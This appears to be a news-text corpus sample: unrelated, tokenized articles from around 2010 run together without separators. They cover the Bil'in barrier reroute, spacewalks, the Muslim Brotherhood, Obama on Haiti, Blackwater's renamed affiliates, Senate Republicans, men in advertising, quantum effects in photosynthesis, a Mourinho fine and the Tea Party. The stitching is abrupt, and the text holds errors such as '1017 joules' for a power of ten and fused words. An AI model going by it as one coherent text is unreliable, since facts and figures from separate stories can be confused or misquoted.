In a boost to the Palestinian protest movement against the West Bank security barrier , the IDF began laying the groundwork this week to reroute 1,700 meters of of the high - voltage fence that has separated farmers in the village of Bil ’in from their olive groves .
“ It gives us hope , that by way of our nonviolent struggle we can achieve some of our [ goals ] , ” Muhammad Khatib , a member of the Bil ’in Popular Committee , toldon Thursday .
In one week , the village will mark five years since it began its campaign against the security barrier , and its Friday protests .
The IDF has rerouted small sections of the barrier in other areas of the West Bank .
But no other village has rallied so long and so consistently against the barrier .
In the nearby village of Ni’lin , Palestinians began protesting on a weekly basis only in 2008 .
Palestinians from both villages and their supporters have thrown stones at border policemen and soldiers .
The security personnel , in turn , have fired tear gas , stun grenades and rubber bullets at the protesters .
On Thursday , however , it was quiet .
Khatib spoke with the Post by the site of the current barrier .
The ground was littered with remnants of tear gas canisters and stun grenades .
On the hilltop by the fence in Bil ’in stands a memorial , in the shape of a tombstone , to Bassem Abu Rahmah , 31 , a villager who was killed in the spring of 2009 when a tear gas canister hit him directly in the chest during a demonstration .
On a concrete block slightly down the hill , black graffiti in Hebrew reads , “ The IDF is a terrorist organization ” and “ Soldiers go home . ”
On a yellow gate , the words “ Free Palestine ” are scrawled .
The IDF began construction of the security barrier in 2002 to stop suicide bombings , which have killed more than 1,000 Israelis in the last decade .
But for Palestinians like Khatib , the barrier is one more attempt by Israel to rob them of their land , particularly given that the route often runs between a village and its farmland , as is the case in Bil’in .
On Thursday , however , just outside the Modi ’in Illit settlement that borders Bil ’in , a small yellow tractor moved dirt on a hilltop to create an access road for bulldozers so they could work on the barrier ’s revised route .
The tractor began work this week , two - and - a - half years after the High Court of Justice ordered the state to change the route of a 1,700 - m. section of the barrier near Bil ’in and more than one year after it was found in contempt of court for not doing so .
According to attorney Michael Sfard , whorepresents the Palestinians in this case , the new route will restore about 650 dunams ( 65 hectares ) of land belonging to Bil ’in farmers to the “ West Bank side ” of the barrier .
Nevertheless , roughly 1,300 dunams of private farmland will remain on the “ Israeli side .
” The petition against the segment of the route bisecting Bil ’in ’s farmland was filed by Ahmed Yassin , head of the village council , on September 5 , 2005 .
Among other things , the petitioner alleged that part of the route was designed to protect the new neighborhood of Modi ’in Illit , known as Matityahu East , even though no one was living there .
Although housing construction had begun in the western part of the neighborhood , there were no plans to build housing in the eastern part for the foreseeable future .
In other words , the security barrier was designed to protect nonexistent people .
According to Peace Now , there had been plans to construct 1,100 apartments in that area – which have now been thwarted by the court decision .
On September 4 , 2007 , the High Court rejected the route and ordered the state to propose a new one according to parameters set down by the court .
These parameters included demands to design the route so that the eastern part of Matityahu East would be on the West Bank side and the barrier itself would be built on state - owned , rather than private Palestinian , land .
It took the army 10 months to propose a new route , and it allegedly did so only after the petitioners filed a contempt - of - court action in June 2008 because the state had failed to implement the High Court ruling until then .
When the army finally revealed its new proposed route , the court promptly rejected it on the grounds that it had failed to follow the parameters that it had set down .
Among its many faults , the court ruled , the state had designed the new route , this time 2,000 m. in length , primarily on private Palestinian land , much of it cultivated .
In addition , it left a substantial part of the eastern half of Matityahu East on the Israeli side of the barrier .
In a decision handed down on December 15 , 2008 , the court ruled that “ the state is ordered to carry out the instructions of the [ original ] ruling without further delay and to design the route of the barrier in accordance with the criteria established in that ruling ... and to do so as quickly as possible .
” Almost 14 months after the contempt - of - court ruling , the state is apparently ready to carry out the court ’s instructions .
An IDF spokesman , however , said the delay was simply part of the planning procedure , which is often protracted and involves many stages in which objections to the route are raised and revisions are made .
He added that the IDF planned to finish the route by the end of the year .
As he watched the bulldozer work , Khatib said his feelings were mixed .
“ It comes after we have paid a high price , ” he said .
Behind him were the olive groves that farmers would soon be able to freely access .
Today , if they want to work their fields , they have to cross through the barrier , a process that often delays their journey by half an hour to an hour .
Sometimes access is denied altogether .
In front of Khatib was the Matityahu East neighborhood , which he believed had been built on land owned by Bil ’in .
“ I ’m proud that we managed to move the fence , ” he said , adding that he still felt the weight of the larger struggle – to free their land from Israeli occupation .
“ It like the game of boxing .
We won the first round , but we did n’t win the game , ” he said .
“ We will still struggle in a nonviolent way until we have all of our lands .
” There is no reason , Khatib said , that the barrier could not have been constructed along the pre-1967 lines .
He was also hesitant to believe that the IDF would go through with its plan , despite the bulldozer .
So on Friday , protesters will gather as usual in Bil ’in to protest the barrier .
Next week , they plan a larger event for the five - year anniversary of the protests .
Some 510 km. of the 805 - km. route have been completed .
According to Anarchists Against the Wall , 19 Palestinians have been killed in demonstrations against the barrier and hundreds wounded .
The Border Police said that scores of police officers had been wounded in these demonstrations .
When astronauts spacewalk , it looks like they 're floating serenely in the vacuum of space .
The reality : they 're hurtling at 17,220 mph inside bulky pressurized suits .
Here 's the lowdown on spacewalking , from how it 's done to what it costs .
Advertisement
The technical name for a spacewalk is an EVA , or extra-vehicular activity , which would probably make for a great pick - up line next time you meet a hot astronaut .
Since Alexei Leonov made the first spacewalk for the Soviet Union in 1965 , 191 humans have ventured into space outside the confines of a craft ( some of them were only partially outside ) .
This number includes American astronauts who walked on the moon .
Most spacewalks occur in orbit around the Earth or the moon , but a few on the Apollo missions were conducted in what NASA refers to as " deep space . "
The first American spacewalker was Edward White , during the Gemini 4 mission in 1965 , just a few months after Leonov .
The photos of White floating in space tethered to his spaceship ( bottom photo ) virtually defined the 1960s popular image of space exploration .
Like
White 's spacewalk , most EVAs are tethered .
Since the tether carries oxygen and water to the astronaut , it allows the suit to be much less bulky .
Advertisement
Compare White 's suit to the untethered one worn by astronaut Bruce McCandless in 1984 .
McCandless ' suit not only had to include all of his life support systems , but he also had to wear the Manned Maneuvering Unit ( MMU ) , which allowed him to propel himself in various directions using pressurized nitrogen .
The MMU was retired and replaced by the smaller SAFER unit , ( Simplified Aid for EVA Rescue ) , proving NASA 's ability to push both the technological and acronymical envelopes .
G/O Media may get a commission Subscribe and Get Your First Bag Free Promo Code AtlasCoffeeDay20
The SAFER unit is used for certain emergency procedures , such as Stephen K. Robinson 's EVA to the bottom of shuttle Discovery to remove some filler tiles that might have caused re-entry problems .
They 're also used for construction jobs in places the tether just wo n't reach .
In fact , most of the time when an astronaut spacewalks , he or she is putting in a few hours as an orbital construction worker .
EVAs have been vital in the construction of the International Space Station , as well as making repairs to the Hubble Telescope and dealing with various mechanical problems that seem to crop up whenever a robotic arm is involved .
The picture below comes from a NASA manual , and depicts a bag of tools designed for repairing the Hubble Space Telescope .
I 'm not sure what the Flash Gordon ray - guns are for .
Advertisement
Of course , NASA and the world 's other space agencies do n't send people on EVAs on a whim .
It 's dangerous work ( although no one has ever died or been seriously injured on an EVA ) .
Astronauts working on the ISS report an initial period of severe disorientation , as their perspective flips from " hand - stand " to " surfboard " and back repeatedly .
The problem is , the abstract shape of the ISS does n't give their brains any up or down cues to latch onto the way the space shuttle does .
Advertisement
Velocity is a big problem , mainly due to space junk .
At over 17,000 mph , any impact is potentially deadly .
A stray bolt from Skylab could strike you with more energy than a bullet , and even if it does n't kill you outright , it could still tear a hole in your suit .
Depressurization , loss of oxygen , and other generally irreversible difficulties immediately follow .
Advertisement
There 's also radiation to worry about .
With no atmosphere or heavy shielding , cosmic rays can build up dangerous rad levels pretty quickly .
All EVA astronauts wear special MOSFET badges that continually monitor their radiation levels .
Finally , you could always get a bad case of the bends from working for up to eight hours in a pressurized suit .
For some missions , astronauts " camp out " in the airlock , set to a lower air pressure .
This flushes nitrogen from the blood and reduces the chances of later experiencing decompression sickness .
Advertisement
If all this has n't scared you off , you could actually take a spacewalk yourself .
Space Adventures , the company that lets insanely rich people take a ride on the ISS , will also let insanely rich people go on a 90 - minute EVA adventure .
It costs an extra $ 15 million and requires an extra month of training .
That actually seems like a fairly accurate estimation of the cost of a spacewalk .
In 2004 , when Russia had to use one of their Orlan suits to make some repairs left unfinished due to malfunctioning NASA gear , they charged NASA 500 hours of spacework , which experts estimated worked out to about $ 10 million .
Since space agencies are not allowed to directly pay each other for work , they exchange work hours as currency .
So basically , if NASA owes another country some money , our astronauts end up doing their homework for them .
Advertisement
Incorporating realistic spacewalks into science - fiction should n't be too difficult .
Keep in mind that the suits are quite hard to move around in — astronauts are very sore after a long shift on an EVA , constantly pushing against the suit .
It 's one reason that female astronauts have been underrepresented among spacewalkers .
From there , just ramp up the danger levels .
Make the radiation deadlier , the high - velocity space debris more plentiful ( possibly as a result of Kessler Syndrome ) .
Maybe throw in some anaerobic space bacteria that will infect the astronaut if it gets in through a punctured suit .
Or just go full Buck Rogers and have a laser battle combined with the weird choreography of a tethered spacewalk .
Mohamed Badeea at news conference in Cairo 16 Jan 2010 / Asmaa Waguih
Egypt ’s Muslim Brotherhood , the world ’s oldest Islamist political group , has named a conservative as its new leader , suggesting that the country ’s biggest opposition group may lower its political profile and focus on a social agenda .
Mohamed Badeea ’s appointment on Saturday followed a heated debate between conservatives wary of stepping up political activities that have already triggered repression from the state and many from a younger generation seeking more political activism .
The Brotherhood , which seeks to introduce Islamic rule by democratic means , is officially banned but grudgingly tolerated by the state , and took about a fifth of the seats in parliament in 2005 by fielding candidates as independents .
Following are questions and answers on the Brotherhood , which is Egypt ’s biggest opposition group :
* WHAT IS THE POLITICAL ROLE OF THE BROTHERHOOD ?
Founded in 1928 , the Muslim Brotherhood has grown despite periodic crackdowns through the decades when it was accused of plots to destabilise the state .
The Brotherhood renounced violence in the 1970s and says it seeks an Islamic state through a democratic system .
In the 1980s , it gained influence among professional syndicates and student bodies .
The Brotherhood is officially banned but grudgingly tolerated by the state , and took about a fifth of the seats in parliament in 2005 by fielding candidates as independents .
The ruling National Democratic Party overwhelmingly controls parliament .
Muslim Brotherhood protest in Cairo against trial of members , 26 Feb 2008 / Nasser Nuri
* WHAT INFLUENCE DOES THE BROTHERHOOD WIELD TODAY ?
The group has been increasingly sidelined from mainstream politics because of state repression and a ban on religious - based parties .
Hundreds of members have been detained , and Brotherhood participation in local council and other elected bodies has been restricted .
Leading figures in the group have ruled out open confrontation with the state on the streets , or even stepping up their political challenge .
Analysts say they fear being crushed by the state , and have opted instead for survival to try to win over society gradually at grassroot level to their vision of an Islamic state .
* WHAT ARE THE GROUP’S CHANCES IN THE NEXT ELECTIONS ?
In the run up to 2008 municipal elections , hundreds of Brotherhood candidates were jailed .
After being allowed to compete for only a fraction of the seats , the group said it would boycott the vote , and analysts say the NDP was unchallenged in about 70 percent of seats .
The Brotherhood ’s image of being the only credible challenger to the NDP at the ballot box has been further diminished by internal divisions and the low political profile of its leaders .
A parliamentary election is due later in 2010 and analysts say the Brotherhood may be squeezed down to only a handful of seats .
Rules for the presidential race in 2011 make it almost impossible for any independent candidate such as one from the Brotherhood to mount a challenge .
* WHERE IS THE DEBATE GOING INSIDE THE BROTHERHOOD ?
Muslim Brotherhood women in Cairo protest against Israeli attacks in Gaza , 21 Jan 2009 / Amr Dalsh
Internal divisions in the Brotherhood were exposed in the run up to the vote for a new leader .
The rift pits an old guard wary of political confrontation against mainly younger members who want the group to be more politically active .
The younger generation also seek internal changes , such as giving women and young people a bigger role in decision - making .
With more cautious voices prevailing , analysts say the Brotherhood is likely to expand its social services and promote its values through religious teaching .
These are the twin pillars of its popularity among the poor .
A fifth of Egypt ’s 78 million people live in dire poverty .
But a retreat from the political frontline may widen divisions and weaken the group ’s ability to rally so many supporters in a single bloc .
This in turn may leave a space for other , possibly more militant , Islamist voices to fill .
“ The Brotherhood has been a kind of counterforce in its reformist opposition , and also to jihadists .
With the weakening of the Brotherhood , a heavy - handed and authoritarian government might create conditions that would foster a resurgence of jihadist groups , ” said John L Esposito , professor at Georgetown University in Washington .

In the tragic aftermath of Haiti ’s 7.0 earthquake , images of the disaster break our hearts and remind us of the fragility of life .
What America must do now — and why
By President Barack Obama in
In the last week , we have been deeply moved by the heartbreaking images of the devastation in Haiti : parents searching through rubble for sons and daughters ; children , frightened and alone , looking for their mothers and fathers .
At this moment , entire parts of Port - au - Prince are in ruins , as families seek shelter in makeshift camps .
It is a horrific scene of shattered lives in a poor nation that has already suffered so much .
In response , I have ordered a swift , coordinated , and aggressive effort to save lives in Haiti .
We have launched one of the largest relief efforts in recent history .
I have instructed the leaders of all agencies to make our response a top priority across the federal government .
We are mobilizing every element of our national capacity : the resources of development agencies , the strength of our armed forces , and most important , the compassion of the American people .
And we are working closely with the Haitian government , the United Nations , and the many international partners who are also aiding in this extraordinary effort .
We act for the sake of the thousands of American citizens who are in Haiti , and for their families back home ; for the sake of the Haitian people who have been stricken with a tragic history , even as they have shown great resilience ; and we act because of the close ties that we have with a neighbor that is only a few hundred miles to the south .
But above all , we act for a very simple reason : in times of tragedy , the United States of America steps forward and helps .
That is who we are .
That is what we do .
For decades , America ’s leadership has been founded in part on the fact that we do not use our power to subjugate others , we use it to lift them up — whether it was rebuilding our former adversaries after World War II , dropping food and water to the people of Berlin , or helping the people of Bosnia and Kosovo rebuild their lives and their nations .
At no time is that more true than in moments of great peril and human suffering .
It is why we have acted to help people combat the scourge of HIV / AIDS in Africa , or to recover from a catastrophic tsunami in Asia .
When we show not just our power , but also our compassion , the world looks to us with a mixture of awe and admiration .
That advances our leadership .
That shows the character of our country .
And it is why every American can look at this relief effort with the pride of knowing that America is acting on behalf of our common humanity .
Right now , our search - and - rescue teams are on the ground , pulling people from the rubble .
Americans from Virginia and California and Florida have worked round the clock to save people whom they ’ve never met .
Our soldiers , sailors , airmen , Marines , and Coast Guardsmen quickly deployed to the scene .
Hand in hand with our civilians , they ’re laboring day and night to facilitate a massive logistical enterprise ; to deliver and distribute food , water , and medicine to save lives ; and to prevent an even larger humanitarian catastrophe .

Feb . 1 , 2010  --
After Blackwater contractors were accused of shooting 17 civilians in Iraq , the State Department announced it would stop doing business with the company , but ABC News has found that several other agencies , including the CIA and the Pentagon , continue to employ the controversial company , under a myriad of names , often via secret , classified contracts .
Blackwater , which changed the name of its parent company to Xe Services last year because of bad publicity , is also operating subdivisions under a variety of altered handles intended to lower its public profile .
In some instances the flagship company has tried to distance itself from these offshoots , insisting they are merely " affiliates . "
Public records and a source familiar with their ownership suggest , however , that the companies are nothing more than new names on the same old Blackwater .
All are owned by Blackwater founder Erik Prince .
According to several military and government sources familiar with Xe 's contracts , Xe also operates under the names Paravant and XPG .
Both " affiliates " are based at the same Moyock , North Carolina address as Xe .
Other Prince - owned companies that have received government contracts include Greystone , Raven , Constellation , US Training Center , GSD Manufacturing , and Presidential Airlines .
The companies are among a total of 20 different limited liability corporations owned by Prince and registered to the same address as Blackwater - Xe .
In September 2007 , Blackwater guards escorting a State Department convoy through Baghdad shot and killed 17 civilians in Nissour Square , resulting in international outrage , the loss of Blackwater 's State Department security contract and criminal charges against the guards .
Late last month Vice President Biden announced that the U.S. government would appeal a recent federal court decision to throw out charges against the guards involved in the shooting .
Damage control after the Nissour Square incident is what inspired Blackwater executives to scrap the iconic brand name of the parent company .
According to several government and military officials , the incident lead to a company shakeup and name change intended to clean up Blackwater 's image and limit legal liabilities .
Blackwater dropped the crosshairs from its company logo , and some executives were forced out .
Then , after a lengthy internal name search , Blackwater decided to become Xe Services .
" Blackwater " had referred to the water of the North Carolina swamp where the company was headquartered , but Xe , according to a company spokeswoman , had no connotations .
The change from Blackwater to Xe was announced in February 2009 .
Less known is that a variety of affiliated companies were also renamed .
In the wake of the Nissour Square shooting Xe was barred from Iraq , and the corporate relaunch was supposed to include a de-emphasis on security contracts and a new focus on providing training .
However , Xe and its rebranded affiliates still work in Afghanistan , and continue to provide security and training , though they often operate as security subcontractors to other contractors .
A recent review by the Special Inspector General for Afghanistan Reconstruction , known as SIGAR , has found that Xe Services has operated under different names .
It often acts as a subcontractor , fulfilling training contracts originally won by other companies such as Raytheon , according to a person who has reviewed the SIGAR materials .
According to several sources apprised of the contract , in Afghanistan Raytheon worked with the Blackwater entity called Paravant , LLC .
" Raytheon is supposed to train Afghan soldiers , but Raytheon subcontracted to Blackwater , " said a source who has reviewed the contracts between the two companies .
Paravant came under scrutiny after a 2009 shooting incident in Afghanistan .
Three Americans and an Afghan contractor were working for Paravant last May when they became involved in the shooting of Afghan civilians in Kabul .
Americans Justin Cannon and Chris Drotleff were arrested in the U.S. earlier this month and face federal charges of second - degree murder .
In a statement , Xe Services said it had " immediately and fully cooperated with the government 's investigation . "
Both Cannon and Drotleff maintain their innocence .
According to people familiar with the Raytheon - Paravant relationship , Raytheon terminated the contract in August of last year as a result of the shooting .
The May shooting also led to an investigation by the Senate Armed Services Committee .
ABC News has confirmed that the Paravant employees connected to the shooting were subcontracted to Raytheon .
Jon Kasle , a Raytheon company spokesman , would not comment on the contract with Paravant , except to say that the company " currently has no contracts with any Blackwater company or subsidiary . "
A second Xe offshoot , XPG , does classified work for the military 's Joint Special Operations Command , JSOC , which handles special forces and special operations in Afghanistan , according to a government source who has seen the contract .
XPG was once known as Select PTC .
In an exclusive report , ABC News revealed that contractors working for Select PTC had carried out a covert raid into Pakistan in 2006 .
A dozen Select PTC " tactical action operatives " were recruited by JSOC for a raid on a suspected al Qaeda training camp , according to a military intelligence planner .
The planner said he did not know the outcome of the mission , which was codenamed " Vibrant Fury . "
Select PTC was Blackwater 's equivalent of the CIA 's paramilitary or the military 's Special Forces , and was used for classified operations with the CIA and JSOC .
Select PTC was involved in classified clandestine activities in countries around the world , including Pakistan , Afghanistan , Iraq , Syria and the Philippines , according to a former military intelligence officer briefed on Select PTC 's operations for the U.S. government .
The same unit was awarded a contract to assassinate al Qaeda leaders around the world .
In August 2009 , the New York Times reported that personnel from a Blackwater offshoot that it called " Blackwater Select " were allegedly responsible for loading missiles and bombs on CIA - operated Predator drones , which are used on suspected al Qaeda operatives and Pakistani militants in Pakistan 's Tribal Areas .
The story was actually referring to Select PTC , but by then the name had been changed to XPG , LLC .
As Select PTC was to Blackwater , so is XPG now to XE – the company 's equivalent of Special Forces .
XPG continues to hold classified contracts with the Pentagon 's JSOC .
One official who has seen XPG 's contract with the Pentagon told ABC News that XPG currently has a classified contract providing security at seven Special Forces facilities in Afghanistan along the Pakistan border .
The contract stipulates that the company receives $ 17,000 per day , earning XPG more than $ 6 million annually , according to a source who has reviewed the contract .
A Xe company spokesperson declined to describe the nature of the contracts that either Paravant or XPG hold with the government .
A source familiar with Paravant and XPG 's relationship to Xe told ABC News that neither was a " subsidiary " of Xe.
Paravant , the source said , was " affiliated " with Xe Services , but not owned by the company .
A review of Paravant 's web site shows that its facilities and services are at the North Carolina address as Xe , and also share another address associated with Xe in Illinois .
Xe Services continues to look for work in Afghanistan .
Earlier this month it placed a bid for a roughly $ 1 billion training and security contract .
The bid has been contested by competing contractors and has not yet been awarded by the Pentagon .
Rep. Jan Schakowsky , D. - Ill. , a member of the House Intelligence Committee , has questioned why Blackwater , under any name , still wins contracts from defense and intelligence agencies .
" After everything that has gone wrong ... with Blackwater , I cannot understand why the U.S. Government has anything to do with them , " said Rep. Schakowsky .
" I have yet to hear a convincing reason for their continued work for the government . "

' We 're always happy to hear from the president , but I do n't really feel any compelling need to do it [ on camera ] , ' Texas Sen. John Cornyn said .
| John Shinkle / POLITICO
Cornyn :
No thanks to Obama Q & A
Senate Republicans do n’t have much of an appetite to give President Barack Obama their version of question - and - answer time — not after seeing how Obama handled House Republicans last week .
“ We ’re always happy to hear from the president , but I do n’t really feel any compelling need to do it [ on camera ] , ” Texas Sen. John Cornyn , the Republicans ' chief campaign strategist , told POLITICO .

The White House has suggested that it would like Obama to address the Senate GOP Conference , with TV cameras present .
Obama administration officials are eager for voters to see Obama operate in a format he relishes — and handle his former Senate colleagues the same way he did last week to House Republicans at their annual retreat .
Asked about the White House invitation to Senate Republicans , Cornyn said : “ For what purpose ?
Was it for photo op or is it serious ?
The president can invite Mitch McConnell , John Boehner or anybody he wants for a serious talk about issues . ”
White House spokesman Robert Gibbs said this week that Obama had been planning to meet with Senate Republicans and that he " would n't have any problem with it being open [ to cameras ] if we spoke to the Senate Republicans , too . "
Obama had an on - camera question - and - answer session this week with Senate Democrats at their annual retreat at Washington ’s Newseum , but there 's little desire to a similar give - and - take among the entire 41 - member Senate GOP Conference .
" They do n't want anything to do with it , " said a GOP insider .
" They want the whole thing to just go away . "
Republicans have considered several different formats for any session with Obama , including a " roundtable discussion , " but do n't believe that it will benefit them politically if Obama comes off as well as he did in Baltimore .
A top GOP aide said Senate Republicans " have already held their annual conference , " and that , at this point , " there 's nothing to invite the president to . "
This source noted that Minority Leader Mitch McConnell ( R - Ky . ) will be part of a " Big Four " meeting of top members from each party with Obama on Tuesday , the first in what is supposed to be a regular monthly session with the president .
" If they want to put that on camera , we 'd support that , " said the GOP aide of the White House .
Cornyn acknowledged that Obama was " in his element " in his meeting with House Republicans .
" I can see why he and his handlers would want to replicate that , ” Cornyn said .
" I think we ’re more interested in serious public policy issues rather than providing another photo - opportunity for the president . ”
A politically diverse group is calling for more exchanges like the one in Baltimore between President Barack Obama and House Republicans .
Left , right want Obama ' question time '
A politically diverse group of bloggers , commentators , techies and politicos on Wednesday will launch an online campaign , Demand Question Time , urging President Barack Obama and GOP congressional leaders to hold regular , televised conversations like the extraordinary exchange in Baltimore on Friday .
Original endorsers include Grover Norquist and Eli Pariser , Joe Trippi and Mark McKinnon , Markos Moulitsas and Ed Morrissey , and many more , including Ari Melber , Katrina vanden Heuvel , Ana Marie Cox and Nate Silver .
The steering committee is made up of Micah Sifry , David Corn , Mike Moffo , Mindy Finn , Jon Henke and Glenn Reynolds .

POLITICO asked White House senior adviser David Axelrod about the possibility of regular question time on Monday , before the online campaign was announced , and he said the president 's aides were more likely to look for one - shot opportunities for Obama to engage with Republicans .
" The thing that made Friday interesting was the spontaneity , " Axelrod said .
" If you slip into a kind of convention , then conventionality will overtake the freshness of that . "
David Corn , Mother Jones 's Washington bureau chief , describes how the new campaign came about : " It 's hard to imagine all of us agreeing on anything ( except perhaps John Edwards 's future in politics ) .
But we had an idea that transcends ideology and cable - talk squabbling and blogosphere bickering .
On Sunday evening , a group of endorsers worked on a Google document of a shortened version of my original draft .
Sharing ideas via e-mail , we quickly resolved any disagreements .
Moffo found a designer who cooked up a nifty logo : a campaign - style button declaring , ' Demand Question Time . '
" None of us are naive and believe that implementing question time will cure what ails our country and our political process .
We do realize that if QT does become a Washington routine , politicians and their aides will do what they can to game it to their advantage .
But even though there are problems with the presidential debates — which have been taken over by the political parties and a corporate - sponsored commission — those events still have value .
If you want more question time — even if only for its entertainment value — you can saddle up with dozens ( and maybe it will turn into hundreds , thousands and millions ) of your fellow Americans in calling on our elected representatives to show us their best stuff on a regular basis . "
Demand Question
Time invites visitors to sign a petition : " We live in a world that increasingly demands more dialogue than monologue .
President Obama 's January 29th question - and - answer session with Republican leaders gave the public a remarkable window into the state of our union and governing process .
It was riveting and educational .
The exchanges were substantive , civil and candid .
And in a rare break from our modern politics , sharp differences between elected leaders were on full public display without rancor or ridicule .
...
" So we call on President Barack Obama and House Minority Leader John Boehner to hold these sessions regularly — and allow them to be broadcast and webcast live and without commercial interruption , sponsorship or intermediaries .
We also urge the President and the Republican Senate caucus to follow suit .
And we ask the President and the House and Senate caucuses of his own party to consider mounting similar direct question - and - answer sessions .
We will ask future Presidents and Congresses to do the same .
It is time to make Question Time a regular feature of our democracy . "

This blatant misandry ( I looked it up ? ) has been going on for a while , quite subtly , and has left an impressive legacy of man-hating television adverts .
The pathetic , bumbling and scared wreck of a man petrified of his own lisping four - old daughter in the Haribo ad serves as a particularly distressing example of this .
“ Ha ha ha !
Men like beer and football and often show tendencies to avoid housework !?
A ha ha , look at them – all eating peanuts and talking about sparkplugs …
The idiots ! ”
You could argue that advertising has been sexist towards women since its inception , with its attitude , objectification and patronising of the lovely lil ?
ladies .
You could argue that , but who would you be arguing with ?
Your computer screen ?
Your cat ?
You could go on to argue that the current batch of vaguely iffy anti-men ads are just going some way to redressing the balance .
I do n't really care , this is just an introduction .
As it seems to be de rigueur to attack easy targets , let 's look at the worst of this festival of hair - colour - based fun – the Just For Men ‘ Job Interview ’ ad .
Granted , this dubbed little ploppy of an advert is n’t the most offensive of the Just For Men output .
Try not to think too much about the one where ?
two pushy little ?
squirts ?
successfully pimp their old , grey dad out in ? a bid ? to replace their absent Mother ( who you can only ?
presume killed herself ) , lest you may cringe - shiver your spine out the top of your head .
Really , how difficult is it to make a terrible ad like this ?
All you need is a mirror , an insensitive daughter , some hair dye and a badly - dressed idiot .
Do we really have to import American ads and then dub them unconvincingly ?
Are Just For Men aiming for a very specific demographic here ?
Again , the man here is taking advice from a daughter who is assuming the matriarch role in the absence of a wife .
Unemployed , grey - haired widows , cuckolded by their kids ca n’t be a huge market can it ?
All that aside , it ’s nice to know that if you ever find yourself as a greying out - of - work tie salesman , Just For Men have the answer .
But only for men .
Stupid , stupid men .
With a penis and two testicles .

الانتعاش الأخير في سوق الأسهم الإيرانية ’ازدهار زائف ‘
يقول خبراء الاقتصاد أن الفقاعة في سوق الأسهم الإيرانية ستنفجر قريبا، في حين حذر عدد قليل من المسؤولين الإيرانيين الناس من أنهم يخاطرون بخسارة رأس مالهم .
In less than one billionth of a second , plants from algae to redwoods transform 95 percent of the sunlight that falls on them — 1017 joules per second bathe the planet — into energy stored chemically as carbohydrates .
The quantum key to doing that lies in a phenomenon known to physicists as quantum coherence , according to new research published in Nature on February 4 .
( Scientific American is part of Nature Publishing Group . )
Quantum coherence describes how more than one molecule interacts with the same energy from one incoming photon at the same time .
In essence , rather than the energy from a particular photon choosing one route to pass through the photosynthetic system , it travels through multiple channels simultaneously , allowing it to pick the quickest route .
" The energy of the absorbed light is finding more than one pathway to move along at any one time , " explains physical chemist Greg Scholes of the University of Toronto , leader of the research group that highlighted the effect .
" We can't pinpoint the energy of that light .
It 's shared in a very special way . "
Scholes and his colleagues isolated the " antenna " ( a protein chain that propagates the incoming energy ) of photosynthetic organisms known as cryptophytes , specifically marine algae Rhodomonas CS24 and Chroomonas CCMP270 .
Cryptophytes are special because they do not all employ the same protein to harvest the energy in sunlight , like the chlorophyll ubiquitous in green plants .
" These guys customize their antenna protein , " Scholes says , noting that the algae also have flagella that permit them to move around .
" They 're quite different colors . "
The algae 's different antenna colors allowed the chemists to pulse the specific proteins with femtosecond ( one quadrillionth of a second ) bursts of laser light .
Based on atomic scale maps provided by previous X - ray crystallography , the researchers tracked the energy as it entered the photosynthetic system and progressed through it to so - called reaction centers , where the energy storage occurs .
The pulses revealed that within single protein molecules the energy traveled down multiple pathways simultaneously .
Thus , the protein antennae 's efficiency relies on quantum coherence , such that molecules within a protein separated by vast distances ( at the atomic scale ) acted in a similar fashion at the same time for a relatively long period of time — more than 400 femtoseconds .
Whereas previous research had shown that purple bacteria used quantum methods to efficiently harness light — and prior experiments had shown similar quantum effects in green sulfur bacterium that had been cooled to 77 kelvins ( –196 degrees Celsius ) — this experiment was the first conducted at room temperature , 294 K , to replicate such effects .
Basically , according to this research , an incoming photon created a series of ripples , like a stone thrown into a pond , that interfere with each other to allow the energy wave to explore all potential pathways through a given protein molecule at the same time , allowing no energy to be lost to any wrong paths .
It is as if you could drive to work via three different routes at the same time , losing no time or energy to traffic delays on any of the given routes , Scholes says .
That allows the photon to travel to the reaction center almost instantaneously .
" In the systems we studied , even at room temperature , you can have these quantum effects and they 're rather significant , " Scholes notes , adding that means the effects are " biologically relevant " ( used by the cryptophytes in their daily existence . ) .
" The short laser pulse is used to expose the phenomenon , not to create it . "
Chemist Graham Fleming at the University of California , Berkeley , has shown that such effects are visible in chlorophyll systems at low temperature .
And biophysicist Gregory Engel of the University of Chicago , who was not involved in this research , argues that such effects are therefore likely to be used in all photosynthetic systems , allowing plants to efficiently transfer energy over long atomic distances .
" That this effect appears in cryptophytes speaks to the generality of the process , " Engel says .
" This work will open the floodgates to new techniques to move and concentrate energy efficiently .
It is extremely important for semiconductor devices [ and ] solar light harvesting . "
In fact , such insights might help inform how to efficiently transfer energy over long atomic distances quickly in human - made systems to harvest sunlight — benefiting from nature 's 2.7 - billion - year head start in optimizing such systems .
" Can it help you make a huge jump through space ?
It does precisely that , " Scholes says .
" It would be really nice to learn some tricks or what you need to think about if you want to design something that would move energy a long distance quickly . "
Inter boss Jose Mourinho has been fined for his outburst following last month 's Milan derby .
Inter boss fined after criticising FIGC regulations
Inter boss Jose Mourinho has been hit with a heavy fine for his outburst following last month 's Milan derby .
The Italian Football Federation ( FIGC ) hit the Portuguese with an € 18,000 ( £ 15,700 ) bill for his derogatory comments against Serie A regulations .
Mourinho claimed officials were out to get his side after two players were sent off in an unsurprisingly feisty clash .
After the game , he said : " everything was done for us not to win , " whilst adding that the match had left a " strange taste " in his mouth .
Mourinho , whose side are nine points clear at the top of Serie A , concluded his verdict by saying : " I 've realised they wo n't let us wrap up the championship early . "
Inter chief executive Ernesto Paolillo was fined € 20,000 ( £ 17,400 ) for questioning the Italian Soccer League 's neutrality after Milan managed to have a fixture before the derby rescheduled .
" The club were fined € 38,000 for the pair 's comments by a disciplinary committee , " read a statement on .
Mourinho agreed to pay a € 13,000 ( £ 11,000 ) fine last week to settle a disciplinary case over an altercation with a journalist in December .
' Open This Gate '
Drawn to the city ’s historic Brandenburg Gate as word spread on the night of Nov. 9 , 1989 , both East and West Berliners clambered up the wall and crowded Pariser Platz to take part in the opening .
Two years earlier at this spot , Ronald Reagan had implored Mikhail Gorbachev in a speech to “ open this gate , ” to “ tear down this wall . ”
Today , the entire area around the 18th century landmark gate , just south of the Reichstag building where the German parliament meets , is a pedestrian plaza .
The Quadriga -- the bronze sculpture atop the Brandenburg Gate -- depicts a chariot drawn by four horses and driven by Victoria , the Roman goddess of victory .
The horses face east .
The “ Tea Party ” movement in the US : A right - wing media creation
By David Walsh
9 February 2010
The “ Tea Party ” movement , which held a convention last weekend in Nashville , Tennessee , is largely a media concoction , aimed at shifting official American political life even further to the right .
The convention gathered “ nearly 600 conservative activists , ” according to ABC News , a weak showing considering the US media has been playing up this “ grassroots movement ” for the past 12 months .
